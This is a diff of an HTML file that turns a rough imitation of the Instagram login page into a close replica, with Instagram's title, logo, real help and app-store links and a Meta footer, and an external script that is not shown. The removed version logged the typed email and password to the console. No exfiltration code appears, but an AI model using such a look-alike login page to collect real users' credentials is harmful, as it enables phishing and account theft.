@@ -1,64 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE-edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="https://cdn.tailwindcss.com" rel="stylesheet">
-</head>
-<body class="h-screen overflow-hidden flex items-center justify-center" style="background: #edf2f7;">
-    <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
-        <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
-            <h1 class="bg-no-repeat instagram-logo"></h1>
-            <form class="mt-8 w-64 flex flex-col" id="loginForm">
-                <input
-                    autofocus
-                    class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
-                    id="email" placeholder="Phone number, username, or email" type="text">
-                <input
-                    class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
-                    id="password" placeholder="Password" type="password">
-                <a class="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium" id="loginButton">
-                    Log In
-                </a>
-            </form>
-            <div class="flex justify-evenly space-x-2 w-64 mt-4">
-                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
-                <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
-                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+  <head>
+    <link rel="stylesheet" href="style.css">
+    <link rel="Icon" type="image/x-icon" href="assets/icon.png">
+    <title>Instagram</title>
+  </head>
+  <body>
+    <div class="wrapper">
+      <article class="article">
+        <div class="content">
+          <div class="login-box">
+            <div class="header">
             </div>
-            <button class="mt-4 flex">
-                <div class="bg-no-repeat facebook-logo mr-1"></div>
-                <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
-            </button>
-            <a class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">Forgot password?</a>
-        </div>
-        <div class="bg-white border border-gray-300 text-center w-80 py-4">
-            <span class="text-sm">Don't have an account?</span>
-            <a class="text-blue-500 text-sm font-semibold">Sign up</a>
-        </div>
-        <div class="mt-3 text-center">
-            <span class="text-xs">Get the app</span>
-            <div class="flex mt-3 space-x-2">
-                <div class="bg-no-repeat apple-store-logo"></div>
-                <div class="bg-no-repeat google-store-logo"></div>
+            <div class="form-wrap">
+              <img class="logo" src="assets/logo.png" alt="Instagram">
+              <form class="form">
+                <div class="input-box">
+                  <input type="text" id="usernameInput" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" required>
+                </div>  
+                <div class="input-box">
+                  <input type="password" id="passwordInput" onkeyup="passwordBtnVisible()" placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                  <div id="showPasswordBtn" onclick="passwordVisible()" style="display: none;">Show</div>
+                </div>  
+                <span class="button-box">
+                  <button id="loginBtn" type="button" disabled>Log in</button>
+                </span>  
+                <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
+              </form>
             </div>
+          </div>
+          <div class="signup-box">
+            <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
+          </div>
+          <div class="app">
+            <p>Get the app.</p>
+            <div class="app-img">
+              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                <img src="assets/appstore.png" >
+              </a>
+              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                <img src="assets/playstore.png">
+              </a>  
+            </div>
+          </div>
         </div>
+      </article>
     </div>
-
-    <script>
-        // Add an event listener to the "Log In" button to handle the form submission
-        const loginButton = document.getElementById("loginButton");
-        loginButton.addEventListener("click", function() {
-            // Get the email and password values from the form
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-
-            // You can add your own validation and login logic here
-            // For now, let's just log the values to the console
-            console.log("Email: " + email);
-            console.log("Password: " + password);
-        });
-    </script>
-</body>
+    <footer class="footer" role="contentinfo">
+      <div class="footer-container">
+        <nav class="footer-nav" role="navigation">
+          <ul>
+            <li><a href="https://about.meta.com/>">Meta</a></li>
+            <li><a href="https://about.instagram.com">About Us</a></li>
+            <li><a href="https://help.instagram.com">Support</a></li>
+            <li><a href="https://about.instagram.com/blog">Blog</a></li>
+            <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+            <li><a href="https://www.instagram.com/developer">Api</a></li>
+            <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
+            <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
+            <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
+            <li><a href="https://about.meta.com/technologies/meta-verified/>">Meta Verified</a></li>
+            <li><a href="">Instagram</a></li>
+          </ul>
+        </nav>
+        <span class="footer-logo">&copy; 2023 Instagram from Meta</span>
+      </div>
+    </footer>
+    <script src="script.js"></script>
+  </body>
 </html>
